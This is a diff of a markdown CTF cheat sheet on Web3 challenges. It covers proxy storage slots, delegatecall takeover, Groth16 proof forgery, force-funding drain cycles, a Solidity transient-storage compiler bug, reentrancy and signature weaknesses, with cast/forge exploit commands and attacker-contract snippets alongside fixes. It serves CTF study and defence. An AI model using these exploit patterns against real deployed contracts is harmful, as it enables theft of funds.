@@ -1,7 +1,6 @@
 # CTF Web - Web3 / Blockchain Challenges
 
 ## Table of Contents
-
 - [Challenge Infrastructure Pattern](#challenge-infrastructure-pattern)
   - [Auth Implementation (Python)](#auth-implementation-python)
 - [EIP-1967 Proxy Pattern Exploitation](#eip-1967-proxy-pattern-exploitation)
@@ -15,9 +14,10 @@
 - [Phantom Market Unresolve + Force-Funding (DiceCTF 2026)](#phantom-market-unresolve--force-funding-dicectf-2026)
 - [Solidity Transient Storage Clearing Helper Collision (Solidity 0.8.28-0.8.33)](#solidity-transient-storage-clearing-helper-collision-solidity-0828-0833)
 - [Reentrancy Attack - DAO Pattern (DefCamp 2017)](#reentrancy-attack---dao-pattern-defcamp-2017)
+- [Signature and Randomness Weaknesses](#signature-and-randomness-weaknesses)
 - [Web3 CTF Tips](#web3-ctf-tips)
 
-------
+---
 
 ## Challenge Infrastructure Pattern
 
@@ -27,7 +27,6 @@
 4. **Check**: GET `/api/challenges/check-solution` → returns flag if `isSolved()` is true
 
 ### Auth Implementation (Python)
-
 ```python
 from eth_account import Account
 from eth_account.messages import encode_defunct
@@ -47,17 +46,15 @@ s.cookies.set('token', r.json()['token'])
 ```
 
 **Key notes:**
-
 - Some CTF servers expect lowercase addresses (not EIP-55 checksummed) — check the frontend JS to confirm. This is NOT universal; other challenges may require checksummed format
 - Bundle.js contains chain ID, contract addresses, and auth flow details
 - Use `cast` (Foundry) for on-chain interactions: `cast call`, `cast send`, `cast storage`
 
-------
+---
 
 ## EIP-1967 Proxy Pattern Exploitation
 
 **Storage slots:**
-
 ```text
 Implementation: keccak256("eip1967.proxy.implementation") - 1
 Admin:          keccak256("eip1967.proxy.admin") - 1
@@ -70,14 +67,13 @@ cast storage $PROXY 0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b
 
 **Key insight:** Proxy delegates calls to implementation, but storage lives on the proxy. `address(this)` in delegatecall = proxy address.
 
-------
+---
 
 ## ABI Coder v1 vs v2 - Dirty Address Bypass
 
 Solidity 0.8.x defaults to ABI coder v2, which validates `address` parameters have zero upper 12 bytes. With `pragma abicoder v1`, no validation.
 
 **Pattern (House of Illusions):**
-
 1. Contract requires dirty address bytes but uses `address` type
 2. ABI coder v2 rejects with empty revert data (`"0x"`)
 3. Deploy with `pragma abicoder v1` → different bytecode, no validation
@@ -85,7 +81,7 @@ Solidity 0.8.x defaults to ABI coder v2, which validates `address` parameters ha
 
 **Detection:** Call reverts with empty data (`"0x"`) = ABI coder v2 validation.
 
-------
+---
 
 ## Solidity CBOR Metadata Stripping for Codehash Bypass
 
@@ -98,35 +94,32 @@ stripped = code[:len(code) - meta_len - 2]
 codehash = keccak256(stripped)
 ```
 
-------
+---
 
 ## Non-Standard ABI Calldata Encoding
 
 **Overlapping calldata:** When contract enforces `msg.data.length == 100` but has `(address, bytes)` params:
-
 ```text
 Standard: 4 + 32(addr) + 32(offset=0x40) + 32(len) + 32(data) = 132 bytes
 Crafted:  4 + 32(dirty_addr) + 32(offset=0x20) + 32(sigil_data) = 100 bytes
 ```
-
 Offset `0x20` serves dual purpose: offset pointer AND bytes length.
 
-------
+---
 
 ## Solidity bytes32 String Encoding
 
 `bytes32("0xAnan or Tensai?")` stores ASCII left-aligned with zero padding:
-
 ```text
 0x3078416e616e206f722054656e7361693f000000000000000000000000000000
 ```
 
-------
+---
 
 ## Complete Exploit Flow (House of Illusions)
 
 ```bash
-export PATH="$PATH:/Users/lcf/.foundry/bin"
+export PATH="$PATH:$HOME/.foundry/bin"
 RPC="https://ethereum-sepolia-rpc.publicnode.com"
 
 forge create src/IllusionHouse.sol:IllusionHouse --private-key $KEY --rpc-url $RPC --broadcast
@@ -136,14 +129,13 @@ cast send $PROXY "appointCurator(address)" $MY_ADDR --private-key $KEY --rpc-url
 cast call $FACTORY "isSolved(address)(bool)" $MY_ADDR --rpc-url $RPC
 ```
 
-------
+---
 
 ## Delegatecall Storage Context Abuse (EHAX 2026)
 
 **Pattern (Heist v1):** Vault contract with `execute()` that does `delegatecall` to a governance contract. `setGovernance()` has **no access control**.
 
 **Storage layout awareness:** `delegatecall` runs callee code in caller's storage context. If vault has:
-
 - Slot 0: `paused` (bool) + `fee` (uint248) — packed
 - Slot 1: `admin` (address)
 - Slot 2: `governance` (address)
@@ -151,7 +143,6 @@ cast call $FACTORY "isSolved(address)(bool)" $MY_ADDR --rpc-url $RPC
 Writing to slot 0/1 in the delegated contract modifies the vault's `paused` and `admin`.
 
 **Attack chain:**
-
 1. Deploy attacker contract matching vault's storage layout
 2. `setGovernance(attacker_address)` — no access control
 3. `execute(abi.encodeWithSignature("attack(address)", player))` — delegatecall
@@ -186,14 +177,13 @@ cast send $VAULT "withdraw()" --rpc-url $RPC --private-key $KEY
 
 **Key insight:** Always check if `setGovernance()` / `setImplementation()` / upgrade functions have access control. Unprotected governance setters + delegatecall = full storage control.
 
-------
+---
 
 ## Groth16 Proof Forgery for Blockchain Governance (DiceCTF 2026)
 
 **Pattern (Housing Crisis):** DAO governance protected by Groth16 ZK proofs. Two ZK-specific vulnerabilities:
 
 **Broken trusted setup (delta == gamma):** Trivially forge any proof:
-
 ```python
 from py_ecc.bn128 import G1, G2, multiply, add, neg
 
@@ -207,12 +197,11 @@ forged_C = neg(vk_x)  # negate the public input accumulator
 **Proof replay (unconstrained nullifier):** DAO never tracks used `proposalNullifierHash` values. Extract a valid proof from the setup contract's deployment transaction and replay it for every proposal.
 
 **When to check in Web3 challenges:**
-
 1. Compare `vk_delta_2` and `vk_gamma_2` — if equal, Groth16 is trivially broken
 2. Check if the verifier contract tracks proof nullifiers
 3. Look for valid proofs in deployment/setup transactions
 
-------
+---
 
 ## Phantom Market Unresolve + Force-Funding (DiceCTF 2026)
 
@@ -225,7 +214,6 @@ forged_C = neg(vk_x)  # negate the public input accumulator
 When `createMarket()` later reaches the phantom market ID, it writes `marketResolution[id] = 0`. This effectively "unresolves" the market, but old `totalYesBet`/`totalNoBet` values persist, enabling a second cashout.
 
 **Vulnerability 3 — Force-fund via selfdestruct:**
-
 ```solidity
 // EIP-6780: selfdestruct in constructor sends ETH even to contracts without receive()
 contract ForceSend {
@@ -237,7 +225,6 @@ contract ForceSend {
 ```
 
 **Drain cycle:**
-
 1. Force-fund DAO with `2*marketBalance` wei
 2. Helper1 bets 1 wei NO on phantom market N
 3. DAO bets `2*marketBalance` YES via delegatecall proposal
@@ -248,14 +235,13 @@ contract ForceSend {
 **Key math:** Payout = `helperBet + helperBet * totalYesBet / totalNoBet = 1 + 1 * 2*mBal / 2 = 1 + mBal`. Market had `mBal + 1`, pays `1 + mBal` → balance = 0.
 
 **Gotchas:**
-
 - **EVM `.call` with insufficient balance silently fails** — size DAO bet so payout ≤ market balance
 - **ethers.js BigInt:** Use `!== 0n` not `!== 0` for comparisons
 - **EIP-6780 selfdestruct:** Must be in constructor (not runtime) for same-tx contract deletion, but ETH transfer works either way
 
 **When to check:** Prediction markets / betting contracts — always test: can you bet on non-existent market IDs? Does market creation reset resolution state without clearing bet totals?
 
-------
+---
 
 ## Solidity Transient Storage Clearing Helper Collision (Solidity 0.8.28-0.8.33)
 
@@ -264,7 +250,6 @@ contract ForceSend {
 **Root cause:** The IR pipeline generates Yul helper functions for `delete` operations. The helper name is derived from the value type but **omits the storage location** (persistent vs. transient). When a contract uses `delete` on both a persistent and transient variable of the same type, both generate identically-named helpers. Whichever compiles first determines the implementation — the other uses the **wrong opcode** (`sstore` instead of `tstore` or vice versa).
 
 **Vulnerable pattern:**
-
 ```solidity
 contract Vulnerable {
     address public owner;                    // persistent, slot 0
@@ -282,14 +267,12 @@ contract Vulnerable {
 ```
 
 **Two exploit directions:**
-
 1. **Transient `delete` uses `sstore`:** Overwrites persistent storage (slot 0 = owner/access control variables). Transient variable remains set, breaking reentrancy locks
 2. **Persistent `delete` uses `tstore`:** Approvals/mappings cannot be revoked. The `tstore` write is discarded at transaction end
 
 **Cross-type collisions via array clearing:** Array `.pop()`, `delete []`, and shrinking operations clear at slot granularity using `uint256` helpers. A `bool[]` clearing collides with `delete uint256 transient _temp`.
 
 **Detection:**
-
 ```bash
 # Compare Yul output — if storage_set_to_zero_ calls change to
 # transient_storage_set_to_zero_ in 0.8.34, the contract was affected
@@ -300,7 +283,7 @@ solc --via-ir --ir Contract.sol > yul_output.txt
 
 **Key insight:** The bug requires all three conditions: `--via-ir` compilation, `delete` on a transient variable, and a matching-type persistent `delete` in the same compilation unit. No compiler warning is produced, and incorrect storage operations do not revert — they silently corrupt state.
 
-------
+---
 
 ## Reentrancy Attack - DAO Pattern (DefCamp 2017)
 
@@ -358,7 +341,6 @@ contract Attacker {
 ```
 
 **Fix patterns:**
-
 ```solidity
 // Option 1: Checks-Effects-Interactions (zero balance BEFORE sending)
 function withdraw() public {
@@ -373,13 +355,33 @@ function withdraw() public {
 payable(msg.sender).transfer(amount);
 
 // Option 3: ReentrancyGuard (OpenZeppelin)
-
 ```
 
 **Key insight:** External calls via `call.value()` before state updates create reentrancy — the attacker's fallback re-enters the vulnerable function before the first call completes. The DAO hack (2016) drained $60M using this exact pattern. Always zero balances or use a mutex before making external calls.
 
-------
+---
 
+## Signature and Randomness Weaknesses
+
+Solidity contracts often verify signatures with `ecrecover` and derive randomness from on-chain state. Common CTF pitfalls:
+
+**Signature malleability/replay:** `ecrecover` accepts the low-`s` and high-`s` forms of the same signature, and a signature is valid for any message it was not bound to. Bind signatures to the contract, signer, nonce, chain ID, and expiry (EIP-712), and track used nonces.
+
+```solidity
+bytes32 digest = keccak256(abi.encodePacked(nonce, msg.sender, amount));
+address signer = ecrecover(digest, v, r, s);
+require(signer == owner, "bad sig");
+require(!used[nonce], "replay");
+used[nonce] = true;
+```
+
+**Predictable randomness:** `block.timestamp`, `blockhash`, and `block.prevrandao` are not secret and can be influenced by miners/validators or known in advance. Never use them for lotteries or key generation; prefer VRF (e.g., Chainlink) or a commit-reveal with front-running checks.
+
+**ECDSA nonce reuse / partial nonces:** Reused or biased `k` values leak the private key (see [ctf-crypto/ecc-attacks.md](../ctf-crypto/ecc-attacks.md)). On-chain signatures with repeated `r` values are instantly crackable.
+
+**Key insight:** Web3 "crypto" bugs are usually signature binding and randomness quality problems, not broken ciphers — check `ecrecover` usage, nonce tracking, and any on-chain RNG before reaching for the signature-math in `ctf-crypto/`.
+
+---
 ## Web3 CTF Tips
 
 - **Factory pattern:** Instance = per-player contract. Check `playerToInstance(address)` mapping.
